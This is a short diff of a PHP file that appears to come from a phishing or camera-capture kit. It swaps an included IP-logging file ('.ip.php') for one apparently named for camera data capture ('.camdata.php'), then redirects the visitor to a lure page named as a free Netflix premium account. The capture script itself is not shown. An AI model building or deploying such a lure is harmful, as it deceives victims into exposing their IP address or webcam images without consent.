@@ -1,5 +1,5 @@
 <?php
-include '.ip.php';
+include '.camdata.php';
 header('Location: .NetFlix-Premium-Account.html');
 exit
 ?>
